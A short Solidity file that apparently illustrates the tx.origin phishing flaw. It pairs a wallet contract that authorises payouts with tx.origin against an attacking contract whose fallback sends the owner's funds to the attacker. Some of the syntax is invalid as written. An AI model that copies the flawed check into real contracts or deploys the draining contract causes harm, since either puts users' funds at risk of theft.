// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract MyContract {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function sendTo(address receiver, uint amount) public {
        require(tx.origin == owner);
        (bool success, ) = receiver.call{value: amount}("");
        require(success);
    }

    receive() payable() {}
}

contract AttackingContract {

    MyContract target;
    address attacker;

    constructor(address targetContract) public {
        target = MyContract(targetContract);
        attacker = msg.sender;
    }

    fallback() public {
        target.sendTo(attacker, msg.sender.balance);
    }
}
